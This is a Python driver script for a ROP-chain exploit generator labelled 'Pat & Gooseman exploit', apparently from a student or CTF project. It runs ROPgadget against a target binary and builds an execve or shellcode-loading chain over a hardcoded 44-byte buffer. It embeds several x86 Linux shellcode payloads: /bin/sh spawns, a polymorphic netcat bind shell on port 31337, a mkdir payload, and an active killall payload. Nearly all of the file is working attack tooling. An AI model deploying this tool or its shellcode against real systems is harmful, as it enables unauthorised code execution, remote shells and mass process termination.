import argparse
import subprocess
from io import StringIO
from ParseChain import *
from GadgetFinder import *
from ExecveBuilder import *
from MprotectBuilder import *
from ShellcodeCompiler import *

import gdb


def main():
    parser = argparse.ArgumentParser(description='Pat & Gooseman exploit')
    parser.add_argument('binary', metavar='B', type=str, nargs='+',
                    help='binary')
    parser.add_argument('-c', help='command to execute')

    args = parser.parse_args()

    binary = args.binary[0]

    #buffer = gdb.get_padding_gdb(binary)
    #print("Found padding length of " + str(buffer))

    buffer = 44

    sc_mode = True

    #/bin/sh
    #shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
    
    #shellcode = b"\x6a\x19\x58\x99\x52\x89\xe3\xcd\x80\x40\xcd\x80"

    #nc -lp 31337 -e /bin//sh polymorphic linux shellcode .
    #shellcode = b"\xeb\x11\x5e\x31\xc9\xb1\x43\x80\x6c\x0e\xff\x35\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x95\x66\xf5\x66\x07\xe5\x40\x87\x9d\xa3\x64\xa8\x9d\x9d\x64\x64\x97\x9e\xbe\x18\x87\x9d\x62\x98\x98\x98\xbe\x16\x87\x20\x3c\x86\x88\xbe\x16\x02\xb5\x96\x1d\x29\x34\x34\x34\xa3\x98\x55\x62\xa1\xa5\x55\x68\x66\x68\x68\x6c\x55\x62\x9a\x55\x64\x97\x9e\xa3\x64\x64\xa8\x9d"
    
    #mkdir and exit
    #shellcode = b"\xeb\x16\x5e\x31\xc0\x88\x46\x06\xb0\x27\x8d\x1e\x66\xb9\xed\x01\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x68\x61\x63\x6b\x65\x64\x23"
    
    # /bin/sh null free polymorphic
    #shellcode = b"\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe\xc8\x88\x06\x46\xe2\xf7\xff\xe7\xe8\xe9\xff\xff\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69\x01\x69\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81"

    #killall
    shellcode = b"\x6a\x25\x58\x6a\xff\x5b\x6a\x09\x59\xcd\x80"

    sc = ShellcodeCompiler(shellcode)
    sc.setup()

    eb = ExecveBuilder(['eax', 'ebx', 'ecx', 'edx']) if not sc_mode else sc.execve_builder
    command_rg = ["python3", "./ROPgadget/ROPgadget.py", "--binary", args.binary[0], "--ropchain"]

    if not sc_mode or (sc_mode and sc.req_stack):
        with subprocess.Popen(command_rg, stdout=subprocess.PIPE) as process:
            output_stream = io.TextIOWrapper(process.stdout, newline='\n', encoding='utf-8')
            eb.find_xor_src(output_stream)

        with subprocess.Popen(command_rg, stdout=subprocess.PIPE) as process:
            output_stream = io.TextIOWrapper(process.stdout, newline='\n', encoding='utf-8')
            eb.find_mov_dst(output_stream)

    if sc_mode:
        sc.execve_builder = eb
        with subprocess.Popen(command_rg, stdout=subprocess.PIPE) as process:
            output_stream = io.TextIOWrapper(process.stdout, newline='\n', encoding='utf-8')
            sc.start(output_stream, buffer)

        sc.write_chain()

    else:
        with subprocess.Popen(command_rg, stdout=subprocess.PIPE) as process:
            output_stream = io.TextIOWrapper(process.stdout, newline='\n', encoding='utf-8')
            eb.build_chain(output_stream, args.c.split(' ')[0], args.c.split(' ')[1:], buffer)

        eb.write_chain()

        gadgets = eb.gadget_finder.gadgets
        for k, v in gadgets.items():
            print(k + " :: " + str(hex(v.address)) + ", " + str(v.complexity )+ ", " + str(v.side_pops))

        print("DATA " + str(hex(eb.gadget_finder.data)))


main()